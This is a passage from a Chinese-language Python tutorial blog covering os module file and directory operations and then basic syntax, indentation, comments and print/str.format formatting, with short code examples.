<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(os.name)    <span class="string">&#x27;&#x27;&#x27;如果是posix，说明系统是Linux、Unix或Mac OS X，</span></span><br><span class="line"><span class="string">                   如果是nt，就是Windows系统。&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">os.uname()        <span class="string">&#x27;&#x27;&#x27;注意uname()函数在Windows上不提供，也就是说，</span></span><br><span class="line"><span class="string">                     os模块的某些函数是跟操作系统相关的。&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">os.environ        <span class="string">&#x27;&#x27;&#x27;在操作系统中定义的环境变量，全部保存在os.environ</span></span><br><span class="line"><span class="string">                     这个变量中&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">os.environ.get(<span class="string">&#x27;key&#x27;</span>)  <span class="string">&#x27;&#x27;&#x27;要获取某个环境变量的值，可以调用os.environ.get(&#x27;key&#x27;)，</span></span><br><span class="line"><span class="string">                        如os.environ.get(&#x27;PATH&#x27;)&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(os.path.abspath(<span class="string">&#x27;.&#x27;</span>))   <span class="string">&#x27;&#x27;&#x27;查看当前目录的绝对路径:&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<br>


<p><strong>操作文件和目录</strong></p>
<p>操作文件和目录的函数一部分放在os模块中，一部分放在os.path模块中，这一点要注意一下。查看、创建和删除目录可以这么调用：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">查看当前目录的绝对路径:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.abspath(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;/Users/michael&#x27;</span></span><br><span class="line">在某个目录下创建一个新目录，首先把新目录的完整路径表示出来:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.join(<span class="string">&#x27;/Users/michael&#x27;</span>, <span class="string">&#x27;testdir&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;/Users/michael/testdir&#x27;</span></span><br><span class="line">然后创建一个目录:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.mkdir(<span class="string">&#x27;/Users/michael/testdir&#x27;</span>)</span><br><span class="line">删掉一个目录:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.rmdir(<span class="string">&#x27;/Users/michael/testdir&#x27;</span>)</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">把两个路径合成一个时，不要直接拼字符串，而要通过os.path.join()函数，这样可以正确处理不同</span><br><span class="line">操作系统的路径分隔符。在Linux/Unix/Mac下，os.path.join()返回这样的字符串：</span><br><span class="line"></span><br><span class="line">part-<span class="number">1</span>/part-<span class="number">2</span></span><br><span class="line"></span><br><span class="line">而Windows下会返回这样的字符串：</span><br><span class="line"></span><br><span class="line">part-<span class="number">1</span>\part-<span class="number">2</span></span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">同样的道理，要拆分路径时，也不要直接去拆字符串，而要通过os.path.split()函数，这样可以</span><br><span class="line">把一个路径拆分为两部分，后一部分总是最后级别的目录或文件名：</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.split(<span class="string">&#x27;/Users/michael/testdir/file.txt&#x27;</span>)</span><br><span class="line">(<span class="string">&#x27;/Users/michael/testdir&#x27;</span>, <span class="string">&#x27;file.txt&#x27;</span>)</span><br><span class="line">os.path.splitext()可以直接让你得到文件扩展名，很多时候非常方便：</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.splitext(<span class="string">&#x27;/path/to/file.txt&#x27;</span>)</span><br><span class="line">(<span class="string">&#x27;/path/to/file&#x27;</span>, <span class="string">&#x27;.txt&#x27;</span>)</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">同样的道理，要拆分路径时，也不要直接去拆字符串，而要通过os.path.split()函数，这样可以把一个路径拆分</span><br><span class="line">为两部分，后一部分总是最后级别的目录或文件名：</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.split(<span class="string">&#x27;/Users/michael/testdir/file.txt&#x27;</span>)</span><br><span class="line">(<span class="string">&#x27;/Users/michael/testdir&#x27;</span>, <span class="string">&#x27;file.txt&#x27;</span>)</span><br><span class="line">os.path.splitext()可以直接让你得到文件扩展名，很多时候非常方便：</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.splitext(<span class="string">&#x27;/path/to/file.txt&#x27;</span>)</span><br><span class="line">(<span class="string">&#x27;/path/to/file&#x27;</span>, <span class="string">&#x27;.txt&#x27;</span>)</span><br><span class="line">这些合并、拆分路径的函数并不要求目录和文件要真实存在，它们只对字符串进行操作。</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">文件操作使用下面的函数。假定当前目录下有一个test.txt文件：</span><br><span class="line"></span><br><span class="line"> 对文件重命名:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.rename(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;test.py&#x27;</span>)</span><br><span class="line"> 删掉文件:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.remove(<span class="string">&#x27;test.py&#x27;</span>)</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">但是复制文件的函数居然在os模块中不存在！原因是复制文件并非由操作系统提供的系统调用。理论上讲，我们</span><br><span class="line">通过上一节的读写文件可以完成文件复制，只不过要多写很多代码。</span><br><span class="line"></span><br><span class="line">幸运的是shutil模块提供了copyfile()的函数，你还可以在shutil模块中找到很多实用函数，它们可以看做是</span><br><span class="line">os模块的补充。</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">最后看看如何利用Python的特性来过滤文件。比如我们要列出当前目录下的所有目录，只需要一行代码：</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[x <span class="keyword">for</span> x <span class="keyword">in</span> os.listdir(<span class="string">&#x27;.&#x27;</span>) <span class="keyword">if</span> os.path.isdir(x)]</span><br><span class="line">[<span class="string">&#x27;.lein&#x27;</span>, <span class="string">&#x27;.local&#x27;</span>, <span class="string">&#x27;.m2&#x27;</span>, <span class="string">&#x27;.npm&#x27;</span>, <span class="string">&#x27;.ssh&#x27;</span>, <span class="string">&#x27;.Trash&#x27;</span>, <span class="string">&#x27;.vim&#x27;</span>, <span class="string">&#x27;Applications&#x27;</span>, <span class="string">&#x27;Desktop&#x27;</span>, ...]</span><br><span class="line">要列出所有的.py文件，也只需一行代码：</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[x <span class="keyword">for</span> x <span class="keyword">in</span> os.listdir(<span class="string">&#x27;.&#x27;</span>) <span class="keyword">if</span> os.path.isfile(x) <span class="keyword">and</span> os.path.splitext(x)[<span class="number">1</span>]==<span class="string">&#x27;.py&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;apis.py&#x27;</span>, <span class="string">&#x27;config.py&#x27;</span>, <span class="string">&#x27;models.py&#x27;</span>, <span class="string">&#x27;pymonitor.py&#x27;</span>, <span class="string">&#x27;test_db.py&#x27;</span>, <span class="string">&#x27;urls.py&#x27;</span>, <span class="string">&#x27;wsgiapp.py&#x27;</span>]</span><br></pre></td></tr></table></figure>



<br>

<br>

<h3 id="四-序列化"><a href="#四-序列化" class="headerlink" title="四. 序列化"></a><font color="#FF6347" face="Comic sans MS">四. 序列化</font></h3><p>参读资料：<br><font face="Comic sans MS"><font color="#00B2EE">《<a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/00143192607210600a668b5112e4a979dd20e4661cc9c97000">廖雪峰的官方网站 序列化</a>》</font><br></font><br><font face="Comic sans MS"><font color="#00B2EE">《<a href="https://www.cnblogs.com/yyds/p/6563608.html">Python之数据序列化（json、pickle、shelve）</a>》</font><br></font><br><font face="Comic sans MS"><font color="#00B2EE">《<a href="https://www.cnblogs.com/zhangxinqi/p/8034380.html">python3之序列化（pickle&amp;json&amp;shelve）</a>》</font><br></font></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-基础语法</title>
    <url>/post/Python-Grammar/</url>
    <content><![CDATA[<p>请务必注意，Python程序是<font color="#FF7F00"><strong>大小写敏感</strong></font>的，如果写错了大小写，程序会报错。</p>
<span id="more"></span>

<p>&amp;ensp;<br>&amp;ensp;</p>
<center><font color="#00B2EE" face="Comic sans MS" size=5>Python 基础语法</font> </center>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="一-标识符"><a href="#一-标识符" class="headerlink" title="一. 标识符"></a><font color="#FF6347" face="Comic sans MS">一. 标识符</font></h3><p><font color="#00B2EE" face="Comic sans MS"><strong>一、标识符定义规则</strong></font></p>
<ol>
<li><p>在 Python 里，标识符由<font color="#FF7F00"><strong>字母</strong></font>、<font color="#FF7F00"><strong>数字</strong></font>、<font color="#FF7F00"><strong>下划线</strong></font>组成。</p>
</li>
<li><p>在 Python 中，所有标识符<font color="#FF7F00"><strong>不能以数字开头</strong></font>。</p>
</li>
<li><p>Python 中的标识符<font color="#FF7F00"><strong>是区分大小写的</strong></font>。</p>
</li>
<li><p>以<font color="#FF7F00"><strong>下划线开头</strong></font>的标识符是<font color="#FF7F00"><strong>有特殊意义</strong></font>的。</p>
<ol>
<li>以单下划线开头 <code>_foo</code> 的代表不能直接访问的类属性，需通过类提供的接口进行访问，不能用 from xxx import * 而导入。</li>
<li>以双下划线开头的 <code>__foo</code> 代表类的私有成员，以双下划线开头和结尾的 <code>__foo__ </code>代表 Python 里特殊方法专用的标识，如 <code>__init__()</code> 代表类的构造函数。</li>
</ol>
</li>
</ol>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>二、Python 保留字符</strong></font></p>
<p>下面的列表显示了在Python中的保留字。这些保留字<font color="#FF7F00"><strong>不能用作常数或变数，或任何其他标识符名称</strong></font>。</p>
<p>|||<br>:-:|:-:|:-:|<br>and    |exec    |not<br>assert    |finally    |or<br>break    |for    |pass<br>class    |from    |print<br>continue    |global    |raise<br>def    |if    |return<br>del    |import    |try<br>elif    |in    |while<br>else    |is    |with<br>except    |lambda    |yield</p>
<br>

<h3 id="二-缩进-代码块"><a href="#二-缩进-代码块" class="headerlink" title="二. 缩进(代码块)"></a><font color="#FF6347" face="Comic sans MS">二. 缩进(代码块)</font></h3><p><font color="#00B2EE" face="Comic sans MS"><strong>一、注意事项：</strong></font></p>
<ol>
<li><p>学习 Python 与其他语言最大的区别就是，Python 的<font color="#FF7F00"><strong>代码块不使用大括号 <code>&#123;&#125;</code> 来控制类，函数以及其他逻辑判断</strong></font>。python 最具特色的就是<font color="#FF7F00"><strong>用缩进来写模块</strong></font>。</p>
</li>
<li><p>缩进的空白数量是可变的，但是<font color="#FF7F00"><strong>所有代码块语句必须包含相同的缩进空白数量</strong></font>，<strong>这个必须严格执行</strong>！！！</p>
</li>
<li><p>按照约定俗成的管理，应该始终坚持使用<font color="red"><strong>4个空格</strong></font>的缩进；</p>
</li>
<li><p>很多Python程序员都建议每行不超过80字符（最多79个见多）；</p>
</li>
<li><p>要将程序的不同部分分开，可使用空行，但不要在程序文件中过多地使用空行</p>
</li>
</ol>
<br>

<p>以下代码将会执行错误：<strong>缩进空白数量不一样会报错！</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment"># 文件名：test.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Answer&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;True&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Answer&quot;</span></span><br><span class="line">    <span class="comment"># 没有严格缩进，在执行时会报错</span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;False&quot;</span></span><br><span class="line"></span><br><span class="line">执行以上代码，会出现如下错误提醒：</span><br><span class="line">$ python test.py  </span><br><span class="line">  File <span class="string">&quot;test.py&quot;</span>, line <span class="number">10</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;False&quot;</span></span><br><span class="line">                ^</span><br><span class="line">IndentationError: unindent does <span class="keyword">not</span> match <span class="built_in">any</span> outer indentation level</span><br></pre></td></tr></table></figure>

<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>二、多个语句构成代码块</strong></font></p>
<ol>
<li><p>Python不像C&#x2F;C++&#x2F;Java一样一条语句是以<code>;</code>结束，而是<font color="#FF7F00"><strong>换行即表示一个语句结束</strong></font>。</p>
</li>
<li><p>缩进相同的一组语句构成一个<strong>代码块</strong>，我们称之代码组。</p>
</li>
<li><p>像if、while、def和class这样的复合语句，<strong>首行以关键字开始</strong>，<strong>以冒号( <code>:</code> )结束</strong>，该行之后的一行或多行缩进代码构成代码组。注意这里冒号( <code>:</code> )不能省略。</p>
</li>
</ol>
<br>

<p>如下实例的冒号不能省略：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> expression : </span><br><span class="line">   suite </span><br><span class="line"><span class="keyword">elif</span> expression :  </span><br><span class="line">   suite  </span><br><span class="line"><span class="keyword">else</span> :  </span><br><span class="line">   suite </span><br></pre></td></tr></table></figure>



<br>

<h3 id="三-一行和多行语句"><a href="#三-一行和多行语句" class="headerlink" title="三. 一行和多行语句"></a><font color="#FF6347" face="Comic sans MS">三. 一行和多行语句</font></h3><blockquote>
<p><font color="red"><strong>一行</strong></font>分为：</p>
</blockquote>
<ol>
<li><font color="#FF7F00"><strong>同一行显示多条语句</strong></font>;</li>
<li>将一行的语句分为多行显示(<font color="#FF7F00"><strong>一条语句以多行来书写</strong></font>)也包括在多行语句里面来讲。</li>
</ol>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>1. 同一行显示多条语句</strong></font></p>
<p>Python可以在同一行中使用多条语句，语句之间<strong>使用分号( <code>;</code> )分割</strong>，以下是一个简单的实例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys; x = <span class="string">&#x27;runoob&#x27;</span>; sys.stdout.write(x + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">运行输出：</span><br><span class="line">runoob</span><br></pre></td></tr></table></figure>



<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>3. 一条语句以多行来书写</strong></font></p>
<p>看下面的多行语句即可，是同一个意思。</p>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>3. 多行语句</strong></font></p>
<blockquote>
<p><font color="red"><strong>多行</strong></font>：</p>
</blockquote>
<ol>
<li><p>Python语句中一般<font color="#FF7F00"><strong>以新行作为语句的结束符</strong></font>，但是我们可以使用斜杠（  <code>\</code> ）将一行的语句分为多行显示，斜杠（  <code>\</code> ）称为<code>多行连接符</code>。</p>
</li>
<li><p>语句中包含 [], {} 或 () 括号就<strong>不需要</strong>使用多行连接符。</p>
</li>
<li><p><font color="#FF7F00"><strong>Python语句中一般以新行作为语句的结束符</strong></font>。但是我们可以使用斜杠（  <code>\</code> ）将一行的语句分为多行显示，如下所示：</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">total = item_one + \</span><br><span class="line">        item_two + \</span><br><span class="line">        item_three</span><br></pre></td></tr></table></figure>

<br>

<ol start="2">
<li>语句中包含 [], {} 或 () 括号就不需要使用多行连接符。如下实例：</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">days = [<span class="string">&#x27;Monday&#x27;</span>, <span class="string">&#x27;Tuesday&#x27;</span>, <span class="string">&#x27;Wednesday&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Thursday&#x27;</span>, <span class="string">&#x27;Friday&#x27;</span>]</span><br></pre></td></tr></table></figure>


<br>

<h3 id="四-引号"><a href="#四-引号" class="headerlink" title="四. 引号"></a><font color="#FF6347" face="Comic sans MS">四. 引号</font></h3><ol>
<li><p>Python 可以使用单引号( <code>&#39;</code> )、双引号( <code>&quot;</code> )、三引号( <code>&#39;&#39;&#39;</code> 或 <code>&quot;&quot;&quot;</code> ) <strong>来表示字符串</strong>，引号的开始与结束必须的相同类型的。</p>
</li>
<li><p><strong>其中三引号可以由多行组成，编写多行文本的快捷语法，常用于文档字符串，在文件的特定地点，</strong><font color="#FF7F00"><strong>被当做注释</strong></font>。</p>
</li>
</ol>
<p>如下示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">word = <span class="string">&#x27;word&#x27;</span></span><br><span class="line">sentence = <span class="string">&quot;这是一个句子。&quot;</span></span><br><span class="line">paragraph = <span class="string">&quot;&quot;&quot;这是一个段落。</span></span><br><span class="line"><span class="string">包含了多个语句&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>


<br>

<h3 id="五-注释"><a href="#五-注释" class="headerlink" title="五. 注释"></a><font color="#FF6347" face="Comic sans MS">五. 注释</font></h3><ol>
<li><font color="#FF7F00"><strong>python中单行注释采用 <code>#</code> 开头。</strong></font></li>
<li>python 中多行注释使用三个单引号( <code>&#39;&#39;&#39;</code> )或三个双引号( <code>&quot;&quot;&quot;</code> )。</li>
</ol>
<p>单行注释,如下示例1：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment"># 文件名：test.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一个注释</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Hello, Python!&quot;</span>  <span class="comment"># 第二个注释</span></span><br></pre></td></tr></table></figure>

<br>
多行注释,如下示例2：

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment"># 文件名：test.py</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">这是多行注释，使用单引号。</span></span><br><span class="line"><span class="string">这是多行注释，使用单引号。</span></span><br><span class="line"><span class="string">这是多行注释，使用单引号。</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">这是多行注释，使用双引号。</span></span><br><span class="line"><span class="string">这是多行注释，使用双引号。</span></span><br><span class="line"><span class="string">这是多行注释，使用双引号。</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<br>

<h3 id="六-空行"><a href="#六-空行" class="headerlink" title="六. 空行"></a><font color="#FF6347" face="Comic sans MS">六. 空行</font></h3><blockquote>
<ol>
<li>函数之间或类的方法之间用空行分隔，表示一段新的代码的开始。类和函数入口之间也用一行空行分隔，以突出函数入口的开始。</li>
<li>空行与代码缩进不同，空行并不是Python语法的一部分。书写时不插入空行，Python解释器运行也不会出错。但是空行的作用在于<font color="#FF7F00"><strong>分隔两段不同功能或含义的代码，便于日后代码的维护或重构</strong></font>。</li>
<li>记住：<font color="#FF7F00"><strong>空行也是程序代码的一部分</strong></font>。</li>
</ol>
</blockquote>
<p>什么是空行？</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="number">2</span>+<span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">           <span class="comment">#这里就是空行</span></span><br><span class="line">b=a+<span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure>


<br>

<h3 id="七-输出-print"><a href="#七-输出-print" class="headerlink" title="七. 输出(print)"></a><font color="#FF6347" face="Comic sans MS">七. 输出(print)</font></h3><p>Python3.0以后的输出使用<code>print()</code>函数。分为<strong>换行输出</strong>和<strong>不换行输出</strong>。<br>在print()括号中加上字符串，就可以向屏幕上输出指定的文字。括号里还可以放表达式等……</p>
<blockquote>
<ol>
<li><strong>换行输出：</strong><font color="#FF7F00"><strong>print 默认输出是换行的</strong></font></li>
<li><strong>不换行输出：</strong>将括号里的所有参数输出在一行，只需要<font color="#FF7F00"><strong>在每一个参数后面加一个<code>,</code></strong></font>即可。<strong>注意：</strong></li>
</ol>
</blockquote>
<ol>
<li>最后一个参数后面没有<code>,</code>，也就是和普通函数使用一样；</li>
<li>参数中间的<code>,</code>输出来是一个空格。如下：</li>
<li>循环输出变量b的时候如果不换行，可在后面加个<code>end=&#39; &#39;</code>，即<code>print(b, end=&#39; &#39;)</code></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Thequickbrownfox&#x27;</span>, <span class="string">&#x27;jumpsover&#x27;</span>, <span class="string">&#x27;thelazydog&#x27;</span>)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">Thequickbrownfox jumpsover thelazydog </span><br></pre></td></tr></table></figure>


<br>


<br>

<h4 id="7-1-输出的补充"><a href="#7-1-输出的补充" class="headerlink" title="7.1 输出的补充"></a><font color="#3CB371" face="Comic sans MS">7.1 输出的补充</font></h4><blockquote>
<p><font face="Microsoft YaHei" color="#FF7F00">Python的三种输出：</font></p>
</blockquote>
<ol>
<li><font face="Microsoft YaHei">Python两种输出值的方式: 表达式语句和<code>print()</code>函数；</font><ol>
<li><font face="Microsoft YaHei">如果你希望输出的形式更加多样，可以使用 <code>str.format()</code> 函数来格式化输出值。</font></li>
<li><font face="Microsoft YaHei">如果你希望将输出的值转成字符串，可以使用 <code>repr()</code> 或 <code>str()</code> 函数来实现</font>.</li>
</ol>
</li>
<li><font face="Microsoft YaHei">第三种方式是使用文件对象的<code> write()</code> 方法，标准输出文件可以用<code>sys.stdout</code>引用</font>！</li>
</ol>
<br>

<h4 id="7-2-输出时常用的函数"><a href="#7-2-输出时常用的函数" class="headerlink" title="7.2 输出时常用的函数"></a><font color="#3CB371" face="Comic sans MS">7.2 输出时常用的函数</font></h4><ul>
<li><font color="#FF7F00"><strong>str()：</strong></font> 将对象转化为适于人阅读的形式，函数返回一个对象的string格式。</li>
<li><font color="#FF7F00"><strong>repr()：</strong></font> 将对象转化为供解释器读取的形式，返回一个对象的 string 格式。可以输出包括转义字符在内的所有字符！</li>
<li><font color="#FF7F00"><strong><code>end=&#39; &#39;</code>：</strong></font> 循坏输出时常用于不换行输出。</li>
<li><font color="#FF7F00"><strong>str.format() ：</strong></font>格式化输出。</li>
</ul>
<br>

<p>举例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = <span class="string">&quot;&#x27;abcd\ne\nfg&#x27;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(x))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(x))</span><br><span class="line"></span><br><span class="line">output：</span><br><span class="line"><span class="string">&#x27;abcd</span></span><br><span class="line"><span class="string">e</span></span><br><span class="line"><span class="string">fg&#x27;</span></span><br><span class="line"><span class="string">&quot;&#x27;abcd\ne\nfg&#x27;&quot;</span></span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;repr() 的参数可以是 Python 的任何对象&#x27;&#x27;&#x27;</span></span><br><span class="line">x = <span class="number">10</span> * <span class="number">3.25</span></span><br><span class="line">y = <span class="number">200</span> * <span class="number">200</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>((x, y, (<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>))))</span><br><span class="line"></span><br><span class="line">output： (<span class="number">32.5</span>, <span class="number">40000</span>, (<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>))</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;  我们都知道正常情况下将多个字符串输出在一行直接使用半角逗号,分隔即可。但是循坏输出要想不换行就得</span></span><br><span class="line"><span class="string">使用 end=&#x27; &#x27;了  &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> a:</span><br><span class="line">  <span class="built_in">print</span>(x)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n----------分隔符-----------&#x27;</span>) </span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> a: </span><br><span class="line">  <span class="built_in">print</span>(y,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n----------分隔符-----------&#x27;</span>) </span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> a: </span><br><span class="line">  <span class="built_in">print</span>(y,end=<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n----------分隔符-----------&#x27;</span>) </span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> a: </span><br><span class="line">  <span class="built_in">print</span>(y,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">OUTPUT：</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">6</span></span><br><span class="line"></span><br><span class="line">----------分隔符-----------</span><br><span class="line"><span class="number">123456</span></span><br><span class="line">----------分隔符-----------</span><br><span class="line">1w2w3w4w5w6w</span><br><span class="line">----------分隔符-----------</span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span></span><br></pre></td></tr></table></figure>



<br>

<h4 id="7-3-str-format-格式化字符串"><a href="#7-3-str-format-格式化字符串" class="headerlink" title="7.3 str.format()格式化字符串"></a><font color="#3CB371" face="Comic sans MS">7.3 str.format()格式化字符串</font></h4><p>旧式的格式化输出在<font color="#00B2EE">[<a href="https://directoree.top/post/Python-Grammar">Python-基础语法</a>]</font>里面讲过，这里的<code>str.format()</code>就是新版的格式化的一种形式。</p>
<p><strong>语法：</strong>字符串类型格式化采用format()方法，基本使用格式是：<br><font color="#FF7F00"><strong>&lt;模板字符串&gt;.format(&lt;逗号分隔的参数&gt;)</strong></font></p>
<p>所谓的**str.format()**：即<code>.format()</code>前是一个字符串，字符串里面有<code>&#123;&#125;</code>相当于旧书式的<code>%</code>。<code>&#123;&#125;</code>及其里面的字符 (称作格式化字段) 将会被 format() 中的参数替换。分为以下几种使用方法：</p>
<br>

<ol>
<li>在括号中的<font color="#FF7F00"><strong>数字</strong></font>用于指向传入对象在 format() 中的<font color="#FF7F00"><strong>索引位置</strong></font>，如下所示：</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#123;0&#125; 和 &#123;1&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#123;1&#125; 和 &#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>))</span><br><span class="line"></span><br><span class="line">OUTPUT：</span><br><span class="line">Google 和 Runoob</span><br><span class="line">Runoob 和 Google</span><br></pre></td></tr></table></figure>

<br>

<ol start="2">
<li>在 format() 中使用了<font color="#FF7F00"><strong>关键字参数, 那么它们的值会指向使用该名字的参数</strong></font>。也可以位置及关键字参数可以任意的结合:</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#123;0&#125; 和 &#123;1&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#123;1&#125; 和 &#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;站点列表 &#123;0&#125;, &#123;1&#125;, 和 &#123;other&#125;。&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>,</span><br><span class="line">                                                       other=<span class="string">&#x27;Taobao&#x27;</span>))</span><br><span class="line"></span><br><span class="line">OUTPUT：</span><br><span class="line">Google 和 Runoob</span><br><span class="line">Runoob 和 Google</span><br><span class="line">站点列表 Google, Runoob, 和 Taobao。</span><br></pre></td></tr></table></figure>

<br>

<ol start="3">
